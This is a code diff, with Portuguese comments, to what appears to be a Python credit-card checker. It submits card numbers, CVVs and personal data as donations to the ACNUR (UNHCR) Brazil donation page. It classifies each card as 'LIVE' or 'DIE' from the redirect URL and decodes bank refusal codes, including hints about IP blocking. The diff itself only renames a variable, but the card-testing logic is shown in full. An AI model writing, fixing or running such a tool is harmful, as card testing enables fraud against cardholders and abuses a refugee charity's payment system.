@@ -152,32 +152,32 @@ try:
 
         data="successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY="+pais.get("currency")+"&EXPDATE="+mes+ano[1:3]+"&TAXID="+cpf+"&AMT=35&TYPE="+tipo2+"%2F"+band+"&PAYPERIOD=MONT&X=&FIRSTNAME="+pnome+"&LASTNAME="+sobrenome+"&EMAIL="+email.replace("@","%40")+"&GENDER="+genero3+"&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1="+nascimento.replace("/","%2F")+"&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1="+nascimento.replace("/","%2F")+"&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET="+endereco.replace(" ","+")+"&STREET2="+bairro.replace(" ","+")+"&CITY="+cidade.replace(" ","+")+"&STATE="+estado+"&ZIP="+cep+"&COUNTRY="+pais.get("alpha2")+"&PHONENUM=%2811%29+98765-4321&CCTYPE="+tipo2+"%2F"+band+"&ACCT="+cc+"&NAME="+nome.replace(" ","+")+"&CVV2="+cvv
 
-        R=requests.request("POST",donate,headers=h,data=data)
-        R=R.url
-        if R=="https://doar.acnur.org/acnur/agradecimento.html":
+        RS=requests.request("POST",donate,headers=h,data=data)
+        RS=RS.url
+        if RS=="https://doar.acnur.org/acnur/agradecimento.html":
             print("[+]Pagamento autorizado! Cartão LIVE!")
         else:
-            R=R.split("=")[3]
+            RS=RS.split("=")[3]
         
             #Variaveis de retorno de erro
-            if R=="REFUSED_PAYMENT":
+            if RS=="REFUSED_PAYMENT":
                 print(f"{R}[-]{C}Transação recusada ({R}Possivel IP Block{C}).")
-            elif R=="DATA_INVALID":
+            elif RS=="DATA_INVALID":
                 print(f"{R}[-]{C}Cartão invalido ({R}DIE{C}).")
-            elif R=="FAIL_UNKNOWN":
+            elif RS=="FAIL_UNKNOWN":
                 print(f"{R}[-]{C}Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).")
-            elif R=="ERROR_NETWORK":
+            elif RS=="ERROR_NETWORK":
                 print(f"{R}[-]{C}Erro de rede.")
-            elif R=="DATA_CARD_NOT_ALLOWED":
+            elif RS=="DATA_CARD_NOT_ALLOWED":
                 print(f"{R}[-]{C}Pagamento nao autorizado.")
-            elif R=="REFUSED_PROVIDER":
+            elif RS=="REFUSED_PROVIDER":
                 print(f"{R}[-]{C}Pagamento recusado pela {Y}{band}{C}.")
-            elif R=="REFUSED_BANK":
+            elif RS=="REFUSED_BANK":
                 print("{}[-]{}Recusado pelo {}{}{}.".format(R,C,Y,banco.get("name"),C))
-            elif R=="DATA_MISSING":
+            elif RS=="DATA_MISSING":
                 print(f"{R}[-]{C}Algum dado faltando.")
             else:
-                print(f"{Y}Erro nao listado, confira: {R}"+R.split("=")[1,2]+RT)
+                print(f"{Y}Erro nao listado, confira: {R}"+RS.split("=")[1,2]+RT)
     
     #Adicionei apenas estados brasileiros e americanos, analisando a request POST, vi que enviava apenas a sigla.
     estados={
